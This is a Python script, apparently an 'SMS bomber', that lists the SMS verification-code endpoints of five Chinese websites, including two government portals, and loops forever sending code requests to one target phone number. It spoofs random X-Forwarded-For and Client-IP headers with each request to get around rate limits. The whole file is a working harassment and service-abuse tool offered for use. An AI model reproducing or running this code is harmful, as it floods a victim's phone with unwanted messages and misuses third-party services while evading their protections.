#!/usr/bin/python 
# -*- coding: utf-8 -*-

import requests
import re
import threading
import os
import random
import socket
import struct
import time

########################################
phone = ""
# 短信接口API 请求间隔时间 备注 请求方式 请求参数 需要SESSION的先决请求URL以及Referer
APIList = [
["https://login.ceconline.com/thirdPartLogin.do",60,"世界经理人","POST",{"mobileNumber":phone,"method": "getDynamicCode","verifyType": "MOBILE_NUM_REG","captcharType":"","time": str(int(time.time()*1000))},""],
["http://www.ntjxj.com/InternetWeb/SendYzmServlet",120,"机动车手机绑定","POST",{"sjhm" : phone},"http://www.ntjxj.com/InternetWeb/regHphmToTel.jsp"],
["https://www.itjuzi.com/api/verificationCodes",60,"IT橘子","POST",{"account": phone},""],
["http://yifatong.com/Customers/gettcode",60,"易法通","GET",{"rnd": ("%0.3f" % (time.time())),"mobile":phone},"http://yifatong.com/Customers/registration?url="],
["http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login",60,"天津企业登记","POST",{'MOBILENO': phone,'TEMP': 1},""]
]
########################################

class initSMS(object):
    """docstring for initSMS"""
    def __init__(self):
        super(initSMS, self).__init__()

    SMSList = []

    def initBomb(self):
        for x in APIList:
            self.SMSList.append(SMSObject(x[0],x[1],x[2],x[3],x[4],x[5]))
        return self.SMSList



class SMSObject(object):
    """docstring for SMSObject"""
    def __init__(self, url, interval, info, method, params, others):
        super(SMSObject, self).__init__()
        self.url = url
        self.interval = interval
        self.info = info
        self.intervalInfo = 0
        self.method = method
        self.params = params
        self.others = others


    url = ""
    interval = 30
    info = ""
    intervalInfo = 0
    method = "GET"
    params = {}
    others = ""

    def getUrl(self):
        return self.url

    def getInfo(self):
        return self.info

    def getParams(self):
        return self.params

    def getMethod(self):
        return self.method

    def getOthers(self):
        return self.others

    def getInterval(self):
        return self.interval

    def getintervalInfo(self):
        return self.intervalInfo

    def setintervalInfo(self, intervalInfo):
        self.intervalInfo = intervalInfo
    


class Bomb(object):
    """docstring for Bomb"""
    def __init__(self):
        super(Bomb, self).__init__()
    
    HEADERS = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
    'Referer': 'http://10.13.0.1',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'zh-CN,zh-TW;q=0.8,zh;q=0.6,en;q=0.4,ja;q=0.2',
    'cache-control': 'max-age=0',
    "X-Requested-With":"XMLHttpRequest"
    }

    def send(self,SMS):
        IP = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        self.HEADERS['X-FORWARDED-FOR'] = IP
        self.HEADERS['CLIENT-IP'] = IP
        session = requests.Session()
        if SMS.getOthers() != "":
            session.get(SMS.getOthers(), timeout=5, headers=self.HEADERS)
            self.HEADERS['Referer'] = SMS.getOthers()
        try:
            if SMS.getMethod() == "GET":
                req = session.get(SMS.getUrl(), params=SMS.getParams(), timeout=5, headers = self.HEADERS)
            else:
                req = session.post(SMS.getUrl(), data=SMS.getParams(), timeout=5, headers = self.HEADERS)
            # print(req.url)
        except Exception as e:
            return str(e)
        return "已发送"


if __name__ == '__main__':
    SMSList = initSMS().initBomb()
    switchOn = Bomb()
    i = 0
    while True:
        for x in SMSList:
            if x.getintervalInfo() == 0:
                i+=1
                info = switchOn.send(x)
                print(str(i) + "." +  x.getInfo() + " " + info)
                x.setintervalInfo(x.getInterval())
            else:
                x.setintervalInfo(x.getintervalInfo() - 1)
        time.sleep(1)

        
